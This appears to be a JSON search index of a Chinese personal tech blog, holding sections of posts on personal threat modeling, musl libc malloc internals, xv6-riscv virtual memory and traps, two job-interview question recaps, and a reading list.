[{"categories":null,"content":"大家或多或少的都希望自己的设备是安全的，但很多时候我们可能做一些安全效益不高的事情，本文旨在介绍威胁模型以帮助大家快速了解自己应该怎么做","date":"2025-09-15","objectID":"/posts/threat_modeling/","tags":["security"],"title":"威胁建模: 你到底想做到什么","uri":"/posts/threat_modeling/"},{"categories":null,"content":"威胁模型: 你到底想做什么 事实上在我看来，威胁模型的提出就是为了平衡，因为很多时候大家是身不由己的，很难做到所谓绝对的安全隐私防范。威胁模型就是针对你个人安全和影视最具威胁的清单，我们应该只关注那些最有可能存在你身边的威胁。 ","date":"2025-09-15","objectID":"/posts/threat_modeling/:0:0","tags":["security"],"title":"威胁建模: 你到底想做到什么","uri":"/posts/threat_modeling/"},{"categories":null,"content":"创建威胁模型 威胁模型通常通过以下五个问题的答案得出: 我想保护什么? 我想保护它免受谁的侵害? 我需要保护它的可能性有多大? 如果我失败了，后果会有多严重? 我愿意经历多少麻烦去避免出现潜在的后果? 1. 我想保护什么 答案自然是想要保护的东西（这句话疑似废话 你需要知道你想保护的资产到底是什么，邮件、个人位置、通信信息还是什么。 2. 我想保护它免受谁的侵害 你需要确定你的对手到底是谁，所谓是知己知彼，百战不殆。这里的对手可能是你认识的人，也可能是互联网上的\"黑客\"，或者是你的竞争对手之类。 3. 我需要保护它的可能性有多大 这里指的是你所保护的资产发生某些威胁的可能性，因为并不是所有威胁都很有可能发生（比如说房屋倒塌）。 4. 如果我失败了，后果会有多严重 你需要知道如果你想保护的资产最终被攻击者窃取，那么到底会发生什么。因为攻击者窃取到了数据后的行为并不完全一致，他可能简单的公开，或者敲诈勒索，或者是售卖……这些都有可能。 5. 我愿意经历多少麻烦去避免出现潜在的后果 你为了保护你的资产到底能做到哪一步？需要认识到的是，几乎所有的防范手段都需要牺牲一些东西，所以这里指出的就是你到底能为了这份保护牺牲多少。 ","date":"2025-09-15","objectID":"/posts/threat_modeling/:1:0","tags":["security"],"title":"威胁建模: 你到底想做到什么","uri":"/posts/threat_modeling/"},{"categories":null,"content":"常见威胁 这里列出常见的威胁，用于帮助你回答上述问题 匿名威胁 指威胁到你网络活动中对个人真实身份的保护 针对性攻击 有\"黑客\"试图访问你的私密数据或设备 供应链攻击 即不是你直接接触的硬件或软件有问题，而是这些东西的直接或间接依赖有问题 被动攻击 针对所有用户的病毒等恶意软件的攻击 服务提供商的监控 经典的例子就是一些网络流量中转时经过的节点，免受它们的监控 大规模监控 这里指的是部分组织会进行的全体监控行为 匿名威胁 虽然匿名威胁经常被认为和隐私保护可以划成等号，但二者并不完全一致。 隐私指的是你不希望对方在使用或共享你的数据时肆无忌惮，而匿名要求你的网络行动要和真实身份完全分离。 很多人其实未必需要考虑到这一点，除非他是什么政治活动家、记者之类 被动攻击 这里就不得不提到经典的论调了，即安全和隐私并不是一回事。 首先，我们应该在足够安全的情况下再考虑隐私的问题 （废话，要是不设防那还考虑什么隐私，但是悲哀的是，目前我们公认的安全做的比较好的一些服务提供商都是一些大型商业公司，面对它们你很难说隐私得到了尊重。 所以我们需要在安全和隐私中做取舍。 一般来说，我们很难说自己正在使用的操作系统是绝对安全的，我们无法保证以后不会受到恶意软件的攻击，所以只能尽量采用一些安全手段避免。 服务提供商的监控 这里不单单说的是互联网服务提供商（ISP），而是各种服务提供商。 我们目前使用的各种软件提供了很多服务，一个经典的例子就是聊天，有关聊天软件的安全隐私讨论你能找到很多，并且有很多小众软件旨在提供一个尽可能保证安全和隐私的即时聊天服务。 但这种小众软件的悲哀是自己身边人不使用从而导致自己也很难一直使用。 大规模监控 大规模监控的经典案例就是由 Edward Snowden 曝光的全球监控计划 参考： Threat Modeling ","date":"2025-09-15","objectID":"/posts/threat_modeling/:2:0","tags":["security"],"title":"威胁建模: 你到底想做到什么","uri":"/posts/threat_modeling/"},{"categories":["源码阅读"],"content":"不自量力阅读 musl libc 的记录，这个 malloc 还没完全读完，读了个大概","date":"2025-04-07","objectID":"/posts/musl_malloc/","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":["源码阅读"],"content":"musl libc 中 malloc 的实现 本文说的 musl libc 是 musl libc 1.25，截止到 2025 年 4 月 6 日，该版本依旧是最新版。 ","date":"2025-04-07","objectID":"/posts/musl_malloc/:0:0","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":["源码阅读"],"content":"介绍 malloc 是 C 语言中用于在内存中动态分配内存块的标准库函数 musl libc 的 malloc 默认使用的是 src/malloc/mallocng 文件夹下的实现，在 configure 脚本中可以看到: srcdir= prefix=/usr/local/musl exec_prefix='$(prefix)' bindir='$(exec_prefix)/bin' libdir='$(prefix)/lib' includedir='$(prefix)/include' syslibdir='/lib' tools= tool_libs= build= target= optimize=auto debug=no warnings=yes shared=auto static=yes wrapper=auto gcc_wrapper=no clang_wrapper=no malloc_dir=mallocng 这些都是默认的选项，其中 malloc_dir 被指定为 mallocng。该脚本支持 --with-malloc= 指定 musl libc 的另一个 malloc 实现 ","date":"2025-04-07","objectID":"/posts/musl_malloc/:1:0","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":["源码阅读"],"content":"malloc 实现 void *malloc(size_t n) { if (size_overflows(n)) return 0; struct meta *g; uint32_t mask, first; int sc; int idx; int ctr; if (n \u003e= MMAP_THRESHOLD) { size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) { unlock(); munmap(p, needed); return 0; } g-\u003emem = p; g-\u003emem-\u003emeta = g; g-\u003elast_idx = 0; g-\u003efreeable = 1; g-\u003esizeclass = 63; g-\u003emaplen = (needed+4095)/4096; g-\u003eavail_mask = g-\u003efreed_mask = 0; // use a global counter to cycle offset in // individually-mmapped allocations. ctx.mmap_counter++; idx = 0; goto success; } sc = size_to_class(n); rdlock(); g = ctx.active[sc]; // use coarse size classes initially when there are not yet // any groups of desired size. this allows counts of 2 or 3 // to be allocated at first rather than having to start with // 7 or 5, the min counts for even size classes. if (!g \u0026\u0026 sc\u003e=4 \u0026\u0026 sc\u003c32 \u0026\u0026 sc!=6 \u0026\u0026 !(sc\u00261) \u0026\u0026 !ctx.usage_by_class[sc]) { size_t usage = ctx.usage_by_class[sc|1]; // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. if (!ctx.active[sc|1] || (!ctx.active[sc|1]-\u003eavail_mask \u0026\u0026 !ctx.active[sc|1]-\u003efreed_mask)) usage += 3; if (usage \u003c= 12) sc |= 1; g = ctx.active[sc]; } for (;;) { mask = g ? g-\u003eavail_mask : 0; first = mask\u0026-mask; if (!first) break; if (RDLOCK_IS_EXCLUSIVE || !MT) g-\u003eavail_mask = mask-first; else if (a_cas(\u0026g-\u003eavail_mask, mask, mask-first)!=mask) continue; idx = a_ctz_32(first); goto success; } upgradelock(); idx = alloc_slot(sc, n); if (idx \u003c 0) { unlock(); return 0; } g = ctx.active[sc]; success: ctr = ctx.mmap_counter; unlock(); return enframe(g, idx, n, ctr); } 上面就是 malloc 的具体实现了，函数上来先判断了申请的内存是否超出了能申请的上界，如果确实超过，就返回 0。 之后则是经典的判断临界点了，它会判断 n 是否超过了 MMAP_THRESHOLD 宏，这个宏的值是 131051，也就是 0x1ffec，所以接下来有分两路，n 的值是否大于 MMAP_THRESHOLD。 ","date":"2025-04-07","objectID":"/posts/musl_malloc/:2:0","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":["源码阅读"],"content":"如果 n 大于 MMAP_THRESHOLD size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) { unlock(); munmap(p, needed); return 0; } g-\u003emem = p; g-\u003emem-\u003emeta = g; g-\u003elast_idx = 0; g-\u003efreeable = 1; g-\u003esizeclass = 63; g-\u003emaplen = (needed+4095)/4096; g-\u003eavail_mask = g-\u003efreed_mask = 0; // use a global counter to cycle offset in // individually-mmapped allocations. ctx.mmap_counter++; idx = 0; goto success; 这是全部代码逻辑，如果你有点听说过 malloc 的实现，那么对这段可能有点眼熟，大概就是分配空间，填充元数据，之后跳到统一处理函数的工作。 这里申请内存的部分就是这两句: size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); 这里计算了申请大小+元数据的大小，之后使用 mmap 分配一块内存区域。之后就涉及到了元数据的分配 元数据的分配 元数据的分配，需要知道以下几个数据结构 ```c struct meta { struct meta *prev, *next; struct group *mem; volatile int avail_mask, freed_mask; uintptr_t last_idx:5; uintptr_t freeable:1; uintptr_t sizeclass:6; uintptr_t maplen:8*sizeof(uintptr_t)-12; }; struct meta_area { uint64_t check; struct meta_area *next; int nslots; struct meta slots[]; }; struct malloc_context { uint64_t secret; #ifndef PAGESIZE size_t pagesize; #endif int init_done; unsigned mmap_counter; struct meta *free_meta_head; struct meta *avail_meta; size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift; struct meta_area *meta_area_head, *meta_area_tail; unsigned char *avail_meta_areas; struct meta *active[48]; size_t usage_by_class[48]; uint8_t unmap_seq[32], bounces[32]; uint8_t seq; uintptr_t brk; }; 分配函数如下: struct meta *alloc_meta(void) { struct meta *m; unsigned char *p; if (!ctx.init_done) { #ifndef PAGESIZE ctx.pagesize = get_page_size(); #endif ctx.secret = get_random_secret(); ctx.init_done = 1; } size_t pagesize = PGSZ; if (pagesize \u003c 4096) pagesize = 4096; if ((m = dequeue_head(\u0026ctx.free_meta_head))) return m; if (!ctx.avail_meta_count) { int need_unprotect = 1; if (!ctx.avail_meta_area_count \u0026\u0026 ctx.brk!=-1) { uintptr_t new = ctx.brk + pagesize; int need_guard = 0; if (!ctx.brk) { need_guard = 1; ctx.brk = brk(0); // some ancient kernels returned _ebss // instead of next page as initial brk. ctx.brk += -ctx.brk \u0026 (pagesize-1); new = ctx.brk + 2*pagesize; } if (brk(new) != new) { ctx.brk = -1; } else { if (need_guard) mmap((void *)ctx.brk, pagesize, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0); ctx.brk = new; ctx.avail_meta_areas = (void *)(new - pagesize); ctx.avail_meta_area_count = pagesize\u003e\u003e12; need_unprotect = 0; } } if (!ctx.avail_meta_area_count) { size_t n = 2UL \u003c\u003c ctx.meta_alloc_shift; p = mmap(0, n*pagesize, PROT_NONE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; ctx.avail_meta_areas = p + pagesize; ctx.avail_meta_area_count = (n-1)*(pagesize\u003e\u003e12); ctx.meta_alloc_shift++; } p = ctx.avail_meta_areas; if ((uintptr_t)p \u0026 (pagesize-1)) need_unprotect = 0; if (need_unprotect) if (mprotect(p, pagesize, PROT_READ|PROT_WRITE) \u0026\u0026 errno != ENOSYS) return 0; ctx.avail_meta_area_count--; ctx.avail_meta_areas = p + 4096; if (ctx.meta_area_tail) { ctx.meta_area_tail-\u003enext = (void *)p; } else { ctx.meta_area_head = (void *)p; } ctx.meta_area_tail = (void *)p; ctx.meta_area_tail-\u003echeck = ctx.secret; ctx.avail_meta_count = ctx.meta_area_tail-\u003enslots = (4096-sizeof(struct meta_area))/sizeof *m; ctx.avail_meta = ctx.meta_area_tail-\u003eslots; } ctx.avail_meta_count--; m = ctx.avail_meta++; m-\u003eprev = m-\u003enext = 0; return m; } 如果不考虑一些特殊情况的话，简单来看，那就是初始化完毕的 ctx，查询是否有 freelist 的存在，有就从这里分配，如果没有就看自己是否还可以分配，可以的话就通过下边这段代码获取新的元数据存储区 ctx.avail_meta_count--; m = ctx.avail_meta++; m-\u003eprev = m-\u003enext = 0; return m; 所以这里存在两个特殊情况，一个是这个 ctx 的初始化，另一个就是 ctx.avail_meta_count 为 0 的情况。 如果 ctx.avail_meta_count 为 0 int need_unprotect = 1; if (!ctx.avail_meta_area_count \u0026\u0026 ctx.brk!=-1) { uintptr_t new = ctx.brk + pagesize; int need_guard = 0; if (!ctx.brk) { need_guard = 1; ctx.brk = brk(0); // some ancient kernels returned _ebss // instead of next page as initial brk. ctx.brk += -ctx.brk \u0026 (pagesize-1); new = ctx.brk ","date":"2025-04-07","objectID":"/posts/musl_malloc/:2:1","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":["源码阅读"],"content":"如果 n 小于 MMAP_THRESHOLD 对于只分配一小块内存的情况， malloc 的处理逻辑如下所示 sc = size_to_class(n); rdlock(); g = ctx.active[sc]; // use coarse size classes initially when there are not yet // any groups of desired size. this allows counts of 2 or 3 // to be allocated at first rather than having to start with // 7 or 5, the min counts for even size classes. if (!g \u0026\u0026 sc\u003e=4 \u0026\u0026 sc\u003c32 \u0026\u0026 sc!=6 \u0026\u0026 !(sc\u00261) \u0026\u0026 !ctx.usage_by_class[sc]) { size_t usage = ctx.usage_by_class[sc|1]; // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. if (!ctx.active[sc|1] || (!ctx.active[sc|1]-\u003eavail_mask \u0026\u0026 !ctx.active[sc|1]-\u003efreed_mask)) usage += 3; if (usage \u003c= 12) sc |= 1; g = ctx.active[sc]; } for (;;) { mask = g ? g-\u003eavail_mask : 0; first = mask\u0026-mask; if (!first) break; if (RDLOCK_IS_EXCLUSIVE || !MT) g-\u003eavail_mask = mask-first; else if (a_cas(\u0026g-\u003eavail_mask, mask, mask-first)!=mask) continue; idx = a_ctz_32(first); goto success; } upgradelock(); idx = alloc_slot(sc, n); if (idx \u003c 0) { unlock(); return 0; } g = ctx.active[sc]; TODO: 等待更新 ","date":"2025-04-07","objectID":"/posts/musl_malloc/:2:2","tags":["musl libc"],"title":"musl libc 阅读记录: malloc","uri":"/posts/musl_malloc/"},{"categories":null,"content":"看起来像测开？无论如何，我没通过","date":"2025-04-06","objectID":"/posts/bytedance_test_interview_1/","tags":["面经"],"title":"字节跳动 基础架构 一面","uri":"/posts/bytedance_test_interview_1/"},{"categories":null,"content":"首先是自我介绍，然后紧接着是一道很简单的算法题: 统计字符串中出现的单词的个数和单词的长度 然后就是八股拷打了 对 shell 命令有了解吗 假设要查找一个名为 abc 的文件，应该怎么做 匹配一个文件中 abc 开头的那一行，应该怎么做 用户态的代码进入到内核态有哪些方式 进程间通信有哪些方式 关于 make 这个工具，如果没有指定目标，默认构建哪个目标 知道进程地址空间的概念吗，介绍一下 环境变量存在哪个地方，就是程序运行时的环境变量存在哪里 gdb 相关 如何看当前调试的程序停在了哪个函数上面 如何查看某个变量的值 如何附加到进程调试它 了解缓冲区溢出攻击的概念吗 如何防范该攻击 musl libc 和 glibc 有什么区别 了解 linux kernel 的工作原理吗，任何一个子系统都可以说下 了解静态扫描吗 参与过什么开源社区吗 介绍一下冒泡排序 冒泡排序有什么优化空间吗 代码编写时，什么情况下容易出现数据类型的隐式转换 用户程序是如何获取到内存的 假如说我的 malloc() 要申请 10MB 大小的内存，它也会调用 sbrk() 系统调用吗 你看过 musl libc 的内存分配函数吗 在你编码的时候，或者做一个项目的时候，如何让你的代码的可维护性更好 这里会问到 musl libc 的原因是我自我介绍时说我阅读过 musl libc 的代码，但难绷的点是我没读过内存分配的部分 ","date":"2025-04-06","objectID":"/posts/bytedance_test_interview_1/:0:0","tags":["面经"],"title":"字节跳动 基础架构 一面","uri":"/posts/bytedance_test_interview_1/"},{"categories":null,"content":"属于是一面凉经，因为我并没有通过面试","date":"2025-03-28","objectID":"/posts/tencent_cloud_interview_1/","tags":["面经"],"title":"腾讯云智 后台开发 一面","uri":"/posts/tencent_cloud_interview_1/"},{"categories":null,"content":"首先当然是自我介绍了，然后就是： ","date":"2025-03-28","objectID":"/posts/tencent_cloud_interview_1/:0:0","tags":["面经"],"title":"腾讯云智 后台开发 一面","uri":"/posts/tencent_cloud_interview_1/"},{"categories":null,"content":"八股 死锁产生条件 内核态和用户态之间是如何切换的，通过了什么方式 进程和线程之间的区别 线程崩溃是否会影响到进程 TCP 和 UDP 的区别，哪个是面向流的 TCP 的拥塞控制 介绍一下 TCP 的四次挥手，可以改成三次吗 了解 IO 多路复用吗，epoll 和 select 的区别是什么 堆栈的区别 Linux 中，栈上的数据需要被显示回收吗 Linux 中，僵尸进程、孤儿进程和守护进程都是什么 如何解决僵尸进程和孤儿进程 对关系型数据库和非关系数据库有了解吗，用过 Hadoop 吗 ","date":"2025-03-28","objectID":"/posts/tencent_cloud_interview_1/:1:0","tags":["面经"],"title":"腾讯云智 后台开发 一面","uri":"/posts/tencent_cloud_interview_1/"},{"categories":null,"content":"算法 二分法求根号二 二叉树的后序遍历 ","date":"2025-03-28","objectID":"/posts/tencent_cloud_interview_1/:2:0","tags":["面经"],"title":"腾讯云智 后台开发 一面","uri":"/posts/tencent_cloud_interview_1/"},{"categories":null,"content":"后记 第一个算法题是在八股的中间考的。 我准备的相当不充分，我承认这些八股都不难，但是我有的确实没答出来，我的问题。 所以虽然结果还没出来，但我认为应该是不会过了。 ","date":"2025-03-28","objectID":"/posts/tencent_cloud_interview_1/:3:0","tags":["面经"],"title":"腾讯云智 后台开发 一面","uri":"/posts/tencent_cloud_interview_1/"},{"categories":null,"content":"一些感觉看起来不错的文章","date":"2025-03-14","objectID":"/posts/reading/","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"C C Is Not a Low-level Language C23 is Finished: Here is What is on the Menu ","date":"2025-03-14","objectID":"/posts/reading/:1:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"C++ Google C++ Style Guide The History of constexpr in C++! (Part One) 彻底理解 C++ ABI 使用 Clang 工具自由的支配 C++ 代码吧 C++ 成员指针完全解析 C++ 禁忌黑魔法：STMP （上） Coroutine Theory ","date":"2025-03-14","objectID":"/posts/reading/:2:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"kernel 内核学习经验 Linux 的性能分析（Perf）实现探究 ","date":"2025-03-14","objectID":"/posts/reading/:3:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"Debug Debugger 的理念，原理和使用 Skipping boring functions in debuggers ","date":"2025-03-14","objectID":"/posts/reading/:4:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"CS 内存模型和内存序 glibc 内存分配器实现探究 Thread Local Storage (TLS) 实现探究 开发一个链接器（1） QEMU 概述 阅读 musl 学到的一些东西 ","date":"2025-03-14","objectID":"/posts/reading/:5:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"Security 个人数据安全不完全指南 Linux Hardening Guide Compiler Options Hardening Guide for C and C++ ","date":"2025-03-14","objectID":"/posts/reading/:6:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":null,"content":"Linux 使用 浅谈Linux的Nvidia闭源驱动问题，以及nvidia-open、Nouveau、NVK驱动的选择 GNOME 和 IBus 和 Wayland 输入法 Gentoo PCI KVM设备直通 ","date":"2025-03-14","objectID":"/posts/reading/:7:0","tags":null,"title":"正在读的文章","uri":"/posts/reading/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，本篇简单说了下 xv6 虚拟化是怎么做的，也就是虚拟内存，进程抽象等","date":"2025-01-24","objectID":"/posts/xv6_riscv_read_kernel_virtual/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 虚拟化","uri":"/posts/xv6_riscv_read_kernel_virtual/"},{"categories":["源码阅读"],"content":"虚拟化 虚拟内存是一种内存管理技术，它提供了“给定机器上实际可用的存储资源的理想化抽象”，它“给用户创造了一个拥有全部内存的错觉”。 计算机操作系统结合使用硬件和软件，将程序使用的内存地址（称为虚拟地址）映射到计算机内存中的物理地址。从进程或任务的角度来看，主存储表现为连续的地址空间或连续段的集合。操作系统管理虚拟地址空间以及实内存到虚拟内存的分配。 CPU 中的地址转换硬件通常称为内存管理单元 (MMU)，可自动将虚拟地址转换为物理地址。 虚拟内存的主要好处包括使应用程序不必管理共享内存空间，能够在进程之间共享库使用的内存，由于内存隔离而提高安全性，以及能够在概念上使用比物理可用更多的内存，使用分页或分段技术。 上面这段来自 WikiPedia xv6 运行在 Sv39 RISC-V 上，也就是说它只使用 64 bit 虚拟地址的低 39 bit。xv6 通过三级页表来寻址 xv6 的 main.c 中，首先初始化了内核页表部分 void kinit() { initlock(\u0026kmem.lock, \"kmem\"); freerange(end, (void*)PHYSTOP); } void freerange(void *pa_start, void *pa_end) { char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE \u003c= (char*)pa_end; p += PGSIZE) kfree(p); } 这里是对锁的初始化，之后再把空间都 free 一遍 之后是初始化内核页表 // Initialize the one kernel_pagetable void kvminit(void) { kernel_pagetable = kvmmake(); } kernel_pagetable 就是一 uint64 的指针 // Make a direct-map page table for the kernel. pagetable_t kvmmake(void) { pagetable_t kpgtbl; kpgtbl = (pagetable_t) kalloc(); memset(kpgtbl, 0, PGSIZE); // uart registers kvmmap(kpgtbl, UART0, UART0, PGSIZE, PTE_R | PTE_W); // virtio mmio disk interface kvmmap(kpgtbl, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); // PLIC kvmmap(kpgtbl, PLIC, PLIC, 0x4000000, PTE_R | PTE_W); // map kernel text executable and read-only. kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X); // map kernel data and the physical RAM we'll make use of. kvmmap(kpgtbl, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W); // map the trampoline for trap entry/exit to // the highest virtual address in the kernel. kvmmap(kpgtbl, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X); // allocate and map a kernel stack for each process. proc_mapstacks(kpgtbl); return kpgtbl; } 可以看出，这里首先分配了一个内核页表，之后填空 0，然后把地址映射过去，然后将其返回 // Allocate one 4096-byte page of physical memory. // Returns a pointer that the kernel can use. // Returns 0 if the memory cannot be allocated. void * kalloc(void) { struct run *r; acquire(\u0026kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-\u003enext; release(\u0026kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } // add a mapping to the kernel page table. // only used when booting. // does not flush TLB or enable paging. void kvmmap(pagetable_t kpgtbl, uint64 va, uint64 pa, uint64 sz, int perm) { if(mappages(kpgtbl, va, sz, pa, perm) != 0) panic(\"kvmmap\"); } // Create PTEs for virtual addresses starting at va that refer to // physical addresses starting at pa. // va and size MUST be page-aligned. // Returns 0 on success, -1 if walk() couldn't // allocate a needed page-table page. int mappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm) { uint64 a, last; pte_t *pte; if((va % PGSIZE) != 0) panic(\"mappages: va not aligned\"); if((size % PGSIZE) != 0) panic(\"mappages: size not aligned\"); if(size == 0) panic(\"mappages: size\"); a = va; last = va + size - PGSIZE; for(;;){ if((pte = walk(pagetable, a, 1)) == 0) return -1; if(*pte \u0026 PTE_V) panic(\"mappages: remap\"); *pte = PA2PTE(pa) | perm | PTE_V; if(a == last) break; a += PGSIZE; pa += PGSIZE; } return 0; } mappages 的核心部分就是下边那个 for 循环 a = va; last = va + size - PGSIZE; for(;;){ if((pte = walk(pagetable, a, 1)) == 0) return -1; if(*pte \u0026 PTE_V) panic(\"mappages: remap\"); *pte = PA2PTE(pa) | perm | PTE_V; if(a == last) break; a += PGSIZE; pa += PGSIZE; } // Return the address of the PTE in page table pagetable // that corresponds to virtual address va. If alloc!=0, // create any required page-table pages. // // The risc-v Sv39 scheme has three levels of page-table // pages. A page-table page contains 512 64-bit PTEs. // A 64-bit virtual address is split into five fields: // 39..63 -- must be zero. // 30..38 -- 9 bits of level-2 index. // 21..29 -- 9 bits of level-1 index. // 12..20 -- 9 bits of level-0 index. // 0..11 -- 12 bits of byte offset within the page. pte_t * walk(pagetable_t pagetable, uint64 va, int alloc) { if(va \u003e= MAXVA) panic(\"walk\"); for(int level = 2; level \u003e 0; level--) { pte_t *pte = \u0026pagetabl","date":"2025-01-24","objectID":"/posts/xv6_riscv_read_kernel_virtual/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 虚拟化","uri":"/posts/xv6_riscv_read_kernel_virtual/"},{"categories":["源码阅读"],"content":"进程 // initialize the proc table. void procinit(void) { struct proc *p; initlock(\u0026pid_lock, \"nextpid\"); initlock(\u0026wait_lock, \"wait_lock\"); for(p = proc; p \u003c \u0026proc[NPROC]; p++) { initlock(\u0026p-\u003elock, \"proc\"); p-\u003estate = UNUSED; p-\u003ekstack = KSTACK((int) (p - proc)); } } 这就是进程的初始化，这里涉及到对进程的出现 struct proc struct proc { struct spinlock lock; // p-\u003elock must be held when using these: enum procstate state; // Process state void *chan; // If non-zero, sleeping on chan int killed; // If non-zero, have been killed int xstate; // Exit status to be returned to parent's wait int pid; // Process ID // wait_lock must be held when using this: struct proc *parent; // Parent process // these are private to the process, so p-\u003elock need not be held. uint64 kstack; // Virtual address of kernel stack uint64 sz; // Size of process memory (bytes) pagetable_t pagetable; // User page table struct trapframe *trapframe; // data page for trampoline.S struct context context; // swtch() here to run process struct file *ofile[NOFILE]; // Open files struct inode *cwd; // Current directory char name[16]; // Process name (debugging) }; ","date":"2025-01-24","objectID":"/posts/xv6_riscv_read_kernel_virtual/:1:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 虚拟化","uri":"/posts/xv6_riscv_read_kernel_virtual/"},{"categories":["源码阅读"],"content":"exec 这时候就涉及到 syscall RISC-V 的系统调用通过 ecall 来完成，ecall 会跳转到内核的一段处理程序中，这个处理程序的地址在 stvec 寄存器中 在 main 函数中，stvec 寄存器第一次初始化是指向来自内核的 trap 处理程序 xv6 的 trap 处理程序大致分成两个——来自用户态的和来自内核态的 目前也没有什么用户空间的事，就先初始化内核态的。用户态的 trap 处理程序会在处理时将 stvec 寄存器改成内核态的，之后在返回时再改回用户态的。 这里说的 trap 是指 CPU 需要放下正在正常执行的指令，强制跳转到另一个处理该情况的代码。比如各种中断，系统调用等，都属于该情况。 // set up to take exceptions and traps while in the kernel. void trapinithart(void) { w_stvec((uint64)kernelvec); } 在 userinit() 函数中，p = allocproc(); 中的 allocproc() 函数涉及到了 // Set up new context to start executing at forkret, // which returns to user space. memset(\u0026p-\u003econtext, 0, sizeof(p-\u003econtext)); p-\u003econtext.ra = (uint64)forkret; p-\u003econtext.sp = p-\u003ekstack + PGSIZE; forkret 中调用了 usertrapret()，这个函数将 stvec 的值设置为了 kernel/trampoline.S 中的 uservec 这里的 ra 寄存器保存了返回地址，和 x86 架构不同的是，RISC-V 有专门的寄存器保存返回地址，而不是像 x86 那样放在栈上，而 ret 指令会直接跳转到 ra 寄存器的值开始执行，所以 ra 寄存器属于被调用者保存寄存器，context 成员就是用来保存这些的寄存器的。 专门有一组汇编指令用来交换当前 CPU 和指定进程的 context swtch: sd ra, 0(a0) sd sp, 8(a0) sd s0, 16(a0) sd s1, 24(a0) sd s2, 32(a0) sd s3, 40(a0) sd s4, 48(a0) sd s5, 56(a0) sd s6, 64(a0) sd s7, 72(a0) sd s8, 80(a0) sd s9, 88(a0) sd s10, 96(a0) sd s11, 104(a0) ld ra, 0(a1) ld sp, 8(a1) ld s0, 16(a1) ld s1, 24(a1) ld s2, 32(a1) ld s3, 40(a1) ld s4, 48(a1) ld s5, 56(a1) ld s6, 64(a1) ld s7, 72(a1) ld s8, 80(a1) ld s9, 88(a1) ld s10, 96(a1) ld s11, 104(a1) ret 所以当调用了 ret 就会跳转到 ra 寄存器的地方开始执行，也就是之前写好的 forkret() 这里有点跳跃了，因为 userinit 之后，初始化工作都完成了之后，main() 会调用 scheduler() void scheduler(void) { struct proc *p; struct cpu *c = mycpu(); c-\u003eproc = 0; for(;;){ // The most recent process to run may have had interrupts // turned off; enable them to avoid a deadlock if all // processes are waiting. intr_on(); int found = 0; for(p = proc; p \u003c \u0026proc[NPROC]; p++) { acquire(\u0026p-\u003elock); if(p-\u003estate == RUNNABLE) { // Switch to chosen process. It is the process's job // to release its lock and then reacquire it // before jumping back to us. p-\u003estate = RUNNING; c-\u003eproc = p; swtch(\u0026c-\u003econtext, \u0026p-\u003econtext); // Process is done running for now. // It should have changed its p-\u003estate before coming back. c-\u003eproc = 0; found = 1; } release(\u0026p-\u003elock); } if(found == 0) { // nothing to run; stop running on this core until an interrupt. intr_on(); asm volatile(\"wfi\"); } } } scheduler 涉及到对 swtch() 的调用，所以会执行到 ret 可以看出 xv6 的调度也很简单，就是轮询着看 forkret() 在最后会执行 usertrapret()，该函数会将当前 CPU 运行状态转换成用户态。 切换到用户态是通过 status 寄存器和 sret 指令实现的，sret 会将当前运行模式调整到 status 的 SPP 位所指定的模式 When an SRET instruction is executed to return from the trap handler, the privilege level is set to user mode if the SPP bit is 0, or supervisor mode if the SPP bit is 1 sret 返回后，第一个程序就开始运行了 (?) 之后 trap 处理程序就被设定为了 trampoline_uservec 也就是用户态的 trap 处理程序，改代码会保存当前进程的状态，之后就跳转到 usertrap()，该函数会根据 status 寄存器的值判断应该怎么处理，而 syscall 就在这里被处理 if(r_scause() == 8){ // system call if(killed(p)) exit(-1); // sepc points to the ecall instruction, // but we want to return to the next instruction. p-\u003etrapframe-\u003eepc += 4; // an interrupt will change sepc, scause, and sstatus, // so enable only now that we're done with those registers. intr_on(); syscall(); } 到了 syscall() 